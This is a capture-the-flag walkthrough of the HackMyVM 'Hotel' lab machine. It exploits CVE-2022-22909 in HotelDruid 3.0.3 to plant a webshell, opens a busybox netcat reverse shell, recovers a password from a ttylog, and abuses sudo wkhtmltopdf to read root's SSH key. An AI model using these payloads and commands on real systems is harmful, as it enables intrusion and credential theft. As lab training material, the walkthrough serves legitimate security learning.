# Hotel

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Hotel | sml | Beginner | HackMyVM |

**Summary:** Hotel is a beginner-level Linux machine from HackMyVM that demonstrates a complete attack chain involving web application exploitation, credential recovery from terminal logs, and privilege escalation through sudo misconfigurations. The initial foothold is gained by exploiting CVE-2022-22909, an unauthenticated Remote Code Execution (RCE) vulnerability in HotelDruid 3.0.3, which allows arbitrary PHP code execution through a malicious room name. After achieving a reverse shell as `www-data`, lateral movement to the user `person` is accomplished by analyzing a ttylog file found in the web directory—this file contains recorded terminal session data that reveals the user's plaintext password. Finally, privilege escalation to root is achieved by exploiting sudo permissions that allow running `wkhtmltopdf` without a password. This binary supports the `--enable-local-file-access` flag, enabling access to local files including root's SSH private key, which is extracted by converting it to a PDF document and then to plaintext.

---

## Reconnaissance

### Network Discovery

The initial network scan identifies the target machine on the local subnet:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.77 08:00:27:6C:82:A2 VirtualBox
```

The target is identified at **192.168.100.77** running on VirtualBox infrastructure.

### Port Scanning & Service Enumeration

A comprehensive Nmap scan reveals two open ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ nmap -sC -sV -p- 192.168.100.77
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 11:01 WIB
Nmap scan report for 192.168.100.77
Host is up (0.0029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 06:1f:a2:25:19:45:2b:2f:44:cc:74:7a:e2:9b:ab:ac (RSA)
|   256 6f:b9:da:fb:eb:6b:4c:de:33:63:b7:ce:f0:2f:f7:cd (ECDSA)
|_  256 84:fb:1d:5c:4c:c6:60:e8:47:d8:2f:a0:92:8e:fb:18 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title:  Hoteldruid
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.68 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 8.4p1 Debian 5 - standard SSH service
- **Port 80 (HTTP):** Nginx 1.18.0 serving a web application titled "Hoteldruid"

### Web Directory Enumeration

Using Gobuster with the DirBuster medium wordlist to discover hidden directories:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ gobuster dir -u http://192.168.100.77/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.77/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 169] [--> http://192.168.100.77/img/]
/themes               (Status: 301) [Size: 169] [--> http://192.168.100.77/themes/]
/doc                  (Status: 301) [Size: 169] [--> http://192.168.100.77/doc/]
/includes             (Status: 301) [Size: 169] [--> http://192.168.100.77/includes/]
/README               (Status: 200) [Size: 204]
/COPYING              (Status: 200) [Size: 34520]
/dati                 (Status: 301) [Size: 169] [--> http://192.168.100.77/dati/]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

Notable findings include `/doc` directory and `README` file.

### Application Fingerprinting

Downloading and examining the README file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ wget http://192.168.100.77/README                                                                                                  --2026-02-04 11:16:25--  http://192.168.100.77/README
Connecting to 192.168.100.77:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 204 [application/octet-stream]
Saving to: 'README'

README                            100%[============================================================>]     204  --.-KB/s    in 0s

2026-02-04 11:16:25 (16.5 MB/s) - 'README' saved [204/204]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ wget http://192.168.100.77/COPYING
--2026-02-04 11:16:32--  http://192.168.100.77/COPYING
Connecting to 192.168.100.77:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34520 (34K) [application/octet-stream]
Saving to: 'COPYING'

COPYING                           100%[============================================================>]  33.71K  --.-KB/s    in 0.007s

2026-02-04 11:16:32 (4.54 MB/s) - 'COPYING' saved [34520/34520]
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ cat README

English readers see README.english in doc folder.

Per le istruzioni in italiano vedere README.italiano nella cartella doc

Para las instrucciones en español mirar README.espagnol en el directorio doc
```

The README references documentation in the `/doc` folder. Retrieving the English documentation:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ curl -I http://192.168.100.77/doc/README.english
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 04 Feb 2026 04:48:52 GMT
Content-Type: application/octet-stream
Content-Length: 16085
Last-Modified: Wed, 18 Aug 2021 15:30:46 GMT
Connection: keep-alive
ETag: "611d27a6-3ed5"
Accept-Ranges: bytes


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ curl -O http://192.168.100.77/doc/README.english
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16085 100 16085   0     0  2426k     0  --:--:-- --:--:-- --:--:--  2618k
```

Examining the documentation reveals the application name and version:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ cat README.english

##########################################################################################
#    HOTELDRUID                                                                          #
#    Copyright (C) 2001-2021 by Marco Maria Francesco De Santis (marco@digitaldruid.net) #
#                                                                                        #
#    This program is free software: you can redistribute it and/or modify                #
#    it under the terms of the GNU Affero General Public License as published by         #
#    the Free Software Foundation, either version 3 of the License, or                   #
#    any later version accepted by Marco Maria Francesco De Santis, which                #
#    shall act as a proxy as defined in Section 14 of version 3 of the                   #
#    license.                                                                            #
#                                                                                        #
#    This program is distributed in the hope that it will be useful,                     #
#    but WITHOUT ANY WARRANTY; without even the implied warranty of                      #
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                       #
#    GNU Affero General Public License for more details.                                 #
#                                                                                        #
#    You should have received a copy of the GNU Affero General Public License            #
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.               #
##########################################################################################

HotelDruid version 3.0.3
...
```

**Critical Discovery:** The application is **HotelDruid version 3.0.3**.

---

## Vulnerability Discovery

### CVE-2022-22909 Research

Searching for known vulnerabilities affecting HotelDruid 3.0.3 leads to **CVE-2022-22909**, an unauthenticated Remote Code Execution vulnerability.

**References:**
- NVD Entry: https://nvd.nist.gov/vuln/detail/CVE-2022-22909
- Proof of Concept: https://github.com/0z09e/CVE-2022-22909

**Vulnerability Details:**
- HotelDruid versions prior to 3.0.5 are vulnerable to RCE
- The vulnerability exists in the room creation functionality
- Attackers can inject PHP code in the room name field
- The malicious code is saved to `dati/selectappartamenti.php`
- No authentication is required if the application is publicly accessible

---

## Initial Access

### Exploiting CVE-2022-22909

Cloning the exploit repository:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ git clone https://github.com/0z09e/CVE-2022-22909.git
Cloning into 'CVE-2022-22909'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 27 (delta 7), reused 11 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (27/27), 127.20 KiB | 1.28 MiB/s, done.
Resolving deltas: 100% (7/7), done.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ cd CVE-2022-22909
```

Reviewing the exploit usage:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ python3 exploit.py -h
/tmp/hotel/CVE-2022-22909/exploit.py:75: SyntaxWarning: invalid escape sequence '\ '
  | $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$
usage: exploit.py [-h] -t TARGET [-u USERNAME] [-p PASSWORD] [--noauth]

options:
  -h, --help            show this help message and exit

required arguments:
  -t, --target TARGET   Target URL. Example : http://10.20.30.40/path/to/hoteldruid
  -u, --username USERNAME
                        Username
  -p, --password PASSWORD
                        password
  --noauth              If No authentication is required to access the dashboard
```

Executing the exploit with `--noauth` flag since the application is publicly accessible:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ python3 exploit.py -t http://192.168.100.77 --noauth
/tmp/hotel/CVE-2022-22909/exploit.py:75: SyntaxWarning: invalid escape sequence '\ '
  | $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$

 /$$   /$$             /$$               /$$       /$$$$$$$                      /$$       /$$
| $$  | $$            | $$              | $$      | $$__  $$                    |__/      | $$
| $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$
| $$$$$$$$ /$$__  $$|_  $$_/   /$$__  $$| $$      | $$  | $$ /$$__  $$| $$  | $$| $$ /$$__  $$
| $$__  $$| $$  \ $$  | $$    | $$$$$$$$| $$      | $$  | $$| $$  \__/| $$  | $$| $$| $$  | $$
| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      | $$  | $$| $$      | $$  | $$| $$| $$  | $$
| $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$$$$$$/| $$      |  $$$$$$/| $$|  $$$$$$$
|__/  |__/ \______/    \___/   \_______/|__/      |_______/ |__/       \______/ |__/ \_______/

Exploit By - 0z09e (https://twitter.com/0z09e)


[*] Trying to access the Dashboard.
[*] Checking the privilege of the user.
[+] User has the privilege to add room.
[*] Adding a new room.
[+] Room has been added successfully.
[*] Testing code exection
[+] Code executed successfully, Go to http://192.168.100.77/dati/selectappartamenti.php and execute the code with the parameter '1'.
[+] Example : http://192.168.100.77/dati/selectappartamenti.php?1=id
[+] Example Output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Exploitation successful!** The exploit created a webshell accessible via the parameter `1` at `http://192.168.100.77/dati/selectappartamenti.php`.

### Verifying Remote Code Execution

Testing the webshell with the `id` command:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ curl http://192.168.100.77/dati/selectappartamenti.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)

<option value=""></option>
<option value="1">1</option>
<option value="2a">2a</option>
```

The command executes successfully as the `www-data` user.

### Establishing Reverse Shell

Setting up a netcat listener on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Crafting a reverse shell payload using BusyBox netcat:

**Payload:** `busybox nc 192.168.100.1 4444 -e /bin/bash`  
**URL Encoded:** `busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash`

Triggering the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ curl http://192.168.100.77/dati/selectappartamenti.php?1=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

Receiving the connection and upgrading to a fully interactive TTY:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 55234
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hotel:~/html/hoteldruid/dati$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@hotel:~/html/hoteldruid/dati$
```

**Initial access achieved as www-data!**

---

## Lateral Movement (User Privilege Escalation)

### Enumerating User Accounts

Listing home directories:

```bash
www-data@hotel:~/html/hoteldruid/dati$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Feb 20  2022 .
drwxr-xr-x 18 root   root   4096 Feb 20  2022 ..
drwxr-xr-x  3 person person 4096 Feb 20  2022 person
www-data@hotel:~/html/hoteldruid/dati$ ls -la /home/person
total 32
drwxr-xr-x 3 person person 4096 Feb 20  2022 .
drwxr-xr-x 3 root   root   4096 Feb 20  2022 ..
-rw------- 1 person person   51 Feb 20  2022 .Xauthority
-rw-r--r-- 1 person person  220 Feb 20  2022 .bash_logout
-rw-r--r-- 1 person person 3526 Feb 20  2022 .bashrc
drwxr-xr-x 3 person person 4096 Feb 20  2022 .local
-rw-r--r-- 1 person person  807 Feb 20  2022 .profile
-rw------- 1 person person   19 Feb 20  2022 user.txt
```

A user named `person` exists with a `user.txt` flag that is not readable by `www-data`.

### Discovering Terminal Session Logs

Investigating the web directory reveals an interesting file:

```bash
www-data@hotel:~/html$ ls -la
total 16
drwxr-xr-x 3 root     root     4096 Feb 20  2022 .
drwxr-xr-x 3 root     root     4096 Feb 20  2022 ..
drwxr-xr-x 7 person   person   4096 Aug 18  2021 hoteldruid
-rw-r--r-- 1 www-data www-data 1592 Feb 20  2022 ttylog
www-data@hotel:~/html$ cat ttylog
�Kb�Kb$person@hotel:~$ �Kb�_    m�Kb��
                                      y�Kb� �Kbm�p�Kb�Kb�
@s�Kb@is�KbL:                                            p�KbE�Kbp�Kb_\a�Kb
i�Kb�*s�KbK"r�Kb�1d�Kb� �Kb]E
            �KbTBt�Kb
                     oh�KbW�i�Kb%1
                                  s�Kb��"�Kb��
                                              o�Kb�n�Kb_�e�Kbt�Kb��Kb�u�Kb�
�Kb��Kb^�KbN�Kb�7E�Kb>�n�Kbad�Kb�u�Kbu+
                                       r�Kb�T4�Kbĥn�Kbx�c�Kb?   3�Kbֵ.�Kb�� �Kb�Ne�Kbf5
n�Kbwj�Kb�Fo�KbEi�Kb��Kb
                        �y�Kb� �Kbp�
                                    i�Kb�t�Kb��
!�Kb

�Kb<�Kbk�Kbd�Kb��Kbr�Kb[�Kb��Kb�Kb �Kb�KbI�Kb;�K�Kb��Kb��K�Kb   �Kb�Kb�Kb�R    �Kb,�   �Kb�T
�Kb'�
�Kb�V
    �Kb�D
        �Kb1Y
�Kb��Kb�Kb��Kb^Kbӟ�Kb��Kbz��Kb
                              ��KbB��Kb-��Kb#7
person@hotel:~$ �Kb�b
exit
www-data@hotel:~/html$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

The file `ttylog` contains binary data - this is a **TTY recording file** that captured terminal session activity.

### Extracting Credentials from TTY Log

Transferring the ttylog file to the attacking machine:

```bash
www-data@hotel:~/html$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Downloading from the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ wget http://192.168.100.77:8080/ttylog                                                                                             --2026-02-04 11:59:28--  http://192.168.100.77:8080/ttylog
Connecting to 192.168.100.77:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1592 (1.6K) [application/octet-stream]
Saving to: 'ttylog'

ttylog                            100%[============================================================>]   1.55K  --.-KB/s    in 0.001s

2026-02-04 11:59:28 (2.97 MB/s) - 'ttylog' saved [1592/1592]
```

Transfer confirmed on the web server:

```bash
192.168.100.1 - - [04/Feb/2026 06:13:17] "GET /ttylog HTTP/1.1" 200 -
```

Analyzing the raw ttylog content using `cat -v` to display control characters:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ cat -v ttylog
M-XK^RbM-Oq^H^@^H^@^@^@^[[?2004hM-XK^Rb^_s^H^@$^@^@^@^[]0;person@hotel: ~^Gperson@hotel:~$ M-[K^RbM-^N_ ^@^A^@^@^@mM-[K^RbM-\M-N^K^@^A^@^@^@yM-\K^Rb^^M-d^B^@^A^@^@^@ M-]K^RbmM-k^A^@^A^@^@^@pM-^K^Rb^SM-S^D^@^D^@^@^@^H^[[KM-^K^Rb^CM-)^L^@^A^@^@^@pM-_K^RbEM-^R^@^@^D^@^@^@^H^[[KM-_K^Rbb^E^H^@^A^@^@^@pM-_K^Rb_\^N^@^A^@^@^@aM-`K^Rb^M@^C^@^A^@^@^@sM-`K^Rb@i^F^@^A^@^@^@sM-`K^RbL:
^@^A^@^@^@wM-aK^Rb%M-^M^@^@^A^@^@^@0M-aK^Rbh"^B^@^A^@^@^@rM-aK^RbM-^Q1^E^@^A^@^@^@dM-aK^RbM-m^E^G^@^A^@^@^@ M-aK^Rb]E^M^@^A^@^@^@iM-bK^RbM-q*^A^@^A^@^@^@sM-bK^Rb^PK^K^@^A^@^@^@ M-eK^RbTB^C^@^A^@^@^@tM-eK^Rb^Ko^E^@^A^@^@^@hM-eK^RbWM-H^F^@^A^@^@^@iM-eK^Rb%1^K^@^A^@^@^@sM-fK^RbM-^SM-^B^G^@^A^@^@^@"M-fK^RbM-4M-"^L^@^A^@^@^@oM-fK^RbM-h^X^N^@^A^@^@^@nM-gK^Rb_M-,^@^@^A^@^@^@eM-hK^RbtT^D^@^D^@^@^@^H^[[KM-hK^RbM-B(^G^@^D^@^@^@^H^[[KM-hK^RbM-^\u      ^@^D^@^@^@^H^[[KM-hK^Rb^EM-.^K^@^D^@^@^@^H^[[KM-hK^Rb7M-z^M^@^D^@^@^@^H^[[KM-iK^RbM-YM-Q^@^@^D^@^@^@^H^[[KM-iK^Rb^M-?^B^@^D^@^@^@^H^[[KM-iK^RbNM-G^G^@^D^@^@^@^H^[[KM-jK^RbM-^B7^N^@^A^@^@^@EM-kK^Rb>M-V^N^@^A^@^@^@nM-lK^Rb^Da^C^@^A^@^@^@dM-lK^RbM-~b^H^@^A^@^@^@uM-lK^Rbu+^L^@^A^@^@^@rM-mK^RbM-^WT^E^@^A^@^@^@4M-nK^RbM-DM-%^A^@^A^@^@^@nM-nK^RbxM-^I^G^@^A^@^@^@cM-oK^Rb^Y?     ^@^A^@^@^@3M-oK^RbM-VM-5^N^@^A^@^@^@.M-qK^RbM-mM-G^A^@^A^@^@^@ M-sK^RbM-/N^F^@^A^@^@^@eM-sK^Rbf5
^@^A^@^@^@nM-sK^Rbw^S^O^@^A^@^@^@jM-tK^RbM-nF^B^@^A^@^@^@oM-tK^RbE^W^D^@^A^@^@^@iM-tK^RbM-zM-9^N^@^D^@^@^@^H^[[KM-uK^Rb^LM-K^@^@^A^@^@^@yM-uK^RbM-^DM- ^H^@^A^@^@^@ M-uK^RbpM-L^K^@^A^@^@^@iM-vK^RbM-<^Q^@^@^A^@^@^@tM-vK^RbM-TM-r
^@^A^@^@^@!M-yK^Rb
^M^L^@^A^@^@^@^GM-{K^Rb^^R^O^@^D^@^@^@^H^[[KM-|K^RbM-!M-^X^C^@^D^@^@^@^H^[[KM-|K^RbM-/d^M^@^A^@^@^@^GM-}K^Rb<M-i^F^@^D^@^@^@^H^[[KM-}K^RbkM-^B^N^@^D^@^@^@^H^[[KM-~K^Rbd)^@^@^D^@^@^@^H^[[KM-~K^RbM-MC^@^@^D^@^@^@^H^[[KM-~K^RbrM-B^@^@^D^@^@^@^H^[[KM-~K^Rb[M-^I^A^@^D^@^@^@^H^[[KM-~K^RbM-dM-F^A^@^D^@^@^@^H^[[KM-~K^Rb^DH^B^@^D^@^@^@^H^[[KM-~K^Rb 2^C^@^D^@^@^@^H^[[KM-~K^Rb^TG^C^@^D^@^@^@^H^[[KM-~K^RbI(^D^@^D^@^@^@^H^[[KM-~K^Rb;H^D^@^D^@^@^@^H^[[KM-~K^Rb^ZN^E^@^H^@^@^@^H^[[K^H^[[KM-~K^RbM-^FM-K^E^@^D^@^@^@^H^[[KM-~K^RbM-RM^F^@^D^@^@^@^H^[[KM-~K^RbM-!O^G^@^H^@^@^@^H^[[K^H^[[KM-~K^Rb        M-N^G^@^D^@^@^@^H^[[KM-~K^RbM-^FM-^X^H^@^D^@^@^@^H^[[KM-~K^RbM-^NM-T^H^@^D^@^@^@^H^[[KM-~K^RbM-*R      ^@^D^@^@^@^H^[[KM-~K^Rb,M-T     ^@^D^@^@^@^H^[[KM-~K^RbM-DT
^@^D^@^@^@^H^[[KM-~K^Rb'M-T
^@^D^@^@^@^H^[[KM-~K^RbM-!V^K^@^D^@^@^@^H^[[KM-~K^RbM-TD^L^@^D^@^@^@^H^[[KM-~K^Rb1Y^L^@^D^@^@^@^H^[[KM-~K^Rb.C^M^@^D^@^@^@^H^[[KM-~K^RbY]^M^@^D^@^@^@^H^[[KM-~K^RbM-n/^N^@^D^@^@^@^H^[[KM-~K^Rb^X]^N^@^D^@^@^@^H^[[KM-~K^RbM-?(^O^@^D^@^@^@^H^[[KM-^?K^Rb^^[^@^@^A^@^@^@^GM-^?K^RbM-SM-^_^@^@^A^@^@^@^GM-^?K^RbM-d^]^A^@^A^@^@^@^GM-^?K^RbzM-^]^A^@^A^@^@^@^GM-^?K^Rb^KM-^N^B^@^A^@^@^@^GM-^?K^RbBM-'^B^@^A^@^@^@^GM-^?K^Rb-M-"^C^@^B^@^@^@^G^GM-^?K^Rb^U#^G^@7^@^@^@^M
^[[?2004l^M^[[?2004h^[]0;person@hotel: ~^Gperson@hotel:~$ M-^?K^RbM-Yb^N^@^Q^@^@^@^[[?2004l^M^M
exit^M
```

The raw output is difficult to parse manually. Using **ipbt** (a ttyrec player) to properly replay the terminal session:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ ipbt
usage: ipbt [ [ -w width ] [ -h height ] | -u ] [ -T | -N ]
            [ -f frame ] [ -P ] file [file...]
where: -w width    specify width of emulated terminal screen (default 80)
       -h height   specify height of emulated terminal screen (default 24)
       -u          use size of real terminal for emulated terminal
       -U          assume input terminal data to be encoded in UTF-8
       -T          assume input files to be ttyrec format
       -N          assume input files to be nh-recorder format
       -f frame    start viewing at a particular frame number
       -P          terminate immediately after reading input
       -A          automatically start playing after reading input
       -L          loop back to the start when playback reaches the end
...

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ ipbt -A ttylog
Reading ttylog (ttyrec) ... 103 frames
Total 103 frames, 1592 bytes loaded, 31585400 bytes of memory used
Total loading time: 0 seconds (0 sec/Mb)
```

The terminal replay reveals the password being typed. Here's the screenshot captured from the ttylog playback:

![image-1.png](image-1.png)

**Critical Finding:** The ttylog file reveals that the user `person` typed their password in plaintext.

### Lateral Movement via SSH

Using the extracted credentials to authenticate as the user `person`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel/CVE-2022-22909]
└─$ ssh person@192.168.100.77
...
person@192.168.100.77's password:
Linux hotel 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
...
person@hotel:~$ id
uid=1000(person) gid=1000(person) grupos=1000(person),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

**Lateral movement successful!** Access achieved as user `person`.

---

## Privilege Escalation

### Sudo Enumeration

Checking sudo privileges:

```bash
person@hotel:~$ sudo -l
Matching Defaults entries for person on hotel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User person may run the following commands on hotel:
    (root) NOPASSWD: /usr/bin/wkhtmltopdf
person@hotel:~$ ls -la /usr/bin/wkhtmltopdf
-rwxr-xr-x 1 root root 412040 ago 17  2020 /usr/bin/wkhtmltopdf
person@hotel:~$ file /usr/bin/wkhtmltopdf
/usr/bin/wkhtmltopdf: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ad5b03843d496fc64b40cfddb99b8c5e604eb442, for GNU/Linux 3.2.0, stripped
```

**Key Finding:** The user `person` can execute `/usr/bin/wkhtmltopdf` as root without a password.

**wkhtmltopdf** is a command-line tool that converts HTML to PDF using the WebKit rendering engine. Critically, it supports the `--enable-local-file-access` flag, which allows accessing local filesystem resources.

### Exploiting wkhtmltopdf for File Exfiltration

Creating a malicious HTML file that uses JavaScript to read local files:

```bash
person@hotel:/tmp$ cat > /tmp/steal.html << 'EOF'
> <html>
> <body>
> <script>
> var x = new XMLHttpRequest();
> x.open("GET", "file:///root/.ssh/id_rsa", false);
> x.send();
> document.write("<pre>" + x.responseText.replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</pre>");
> </script>
> </body>
> </html>
> EOF
```

**Explanation of the HTML payload:**
1. Creates an XMLHttpRequest to read local files
2. Opens and reads `/root/.ssh/id_rsa` (root's SSH private key)
3. Writes the content into the HTML document
4. HTML entities are escaped to prevent rendering issues

Executing wkhtmltopdf with sudo and the `--enable-local-file-access` flag:

```bash
person@hotel:/tmp$ sudo /usr/bin/wkhtmltopdf --enable-local-file-access /tmp/steal.html /tmp/key2.pdf
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
Loading page (1/2)
Printing pages (2/2)
Done
```

The PDF is successfully generated with the root SSH key embedded in it.

### Exfiltrating the Root SSH Key

Starting a Python HTTP server to transfer the PDF:

```bash
person@hotel:/tmp$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Downloading from the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ wget http://192.168.100.77:8080/key2.pdf
--2026-02-04 12:41:46--  http://192.168.100.77:8080/key2.pdf
Connecting to 192.168.100.77:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15918 (16K) [application/pdf]
Saving to: 'key2.pdf'

key2.pdf       100%  15.54K  --.-KB/s    in 0.01s

2026-02-04 12:41:46 (1.39 MB/s) - 'key2.pdf' saved [15918/15918]
```

Transfer confirmation:

```bash
192.168.100.1 - - [04/Feb/2026 06:41:45] "GET /key2.pdf HTTP/1.1" 200 -
```

Converting the PDF to plaintext to extract the SSH key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ pdftotext key2.pdf -
-----BEGIN OPENSSH PRIVATE KEY----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
.....................[REDACTED].....................
+MSFR/tgD8RslzAAAACnJvb3RAaG90ZWw=
-----END OPENSSH PRIVATE KEY-----
```

The SSH private key is extracted but needs formatting correction (the header line is corrupted). Fixing the key format:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ vim root_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ chmod 600 root_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ ssh-keygen -y -f root_rsa
ssh-rsa AAAA[REDACTED]bUV5E95pk= root@hotel
```

The key is valid and corresponds to `root@hotel`.

### Root Access

Authenticating as root using the extracted SSH private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hotel]
└─$ ssh -i root_rsa root@192.168.100.77
...
Linux hotel 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
...
root@hotel:~# id ; whoami; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
hotel
root@hotel:~# cat /home/person/user.txt /root/root.txt
[REDACTED]HMV
[REDACTED]HMV
```

**Privilege escalation successful!** Full root access achieved on the Hotel machine.

---

## Attack Chain Summary

1. **Reconnaissance**: Identified HotelDruid 3.0.3 running on nginx 1.18.0 through network scanning, port enumeration, web directory discovery, and documentation analysis.

2. **Vulnerability Discovery**: Researched CVE-2022-22909, an unauthenticated Remote Code Execution vulnerability in HotelDruid versions < 3.0.5, exploitable via PHP code injection in the room name parameter.

3. **Initial Exploitation**: Executed CVE-2022-22909 exploit using public PoC (0z09e's exploit script) to create a webshell at `/dati/selectappartamenti.php`, verified RCE with `id` command, and established reverse shell using BusyBox netcat to gain `www-data` access.

4. **Lateral Movement**: Discovered `ttylog` terminal recording file in `/var/www/html/`, exfiltrated and replayed it using `ipbt` (ttyrec player), extracted plaintext password for user `person` from the terminal session recording, and authenticated via SSH to escalate to user privileges.

5. **Privilege Escalation**: Enumerated sudo permissions revealing `(root) NOPASSWD: /usr/bin/wkhtmltopdf`, exploited wkhtmltopdf's `--enable-local-file-access` flag to create malicious HTML with XMLHttpRequest reading `/root/.ssh/id_rsa`, converted HTML to PDF as root, exfiltrated PDF and extracted root's SSH private key using `pdftotext`, and authenticated as root via SSH to achieve complete system compromise.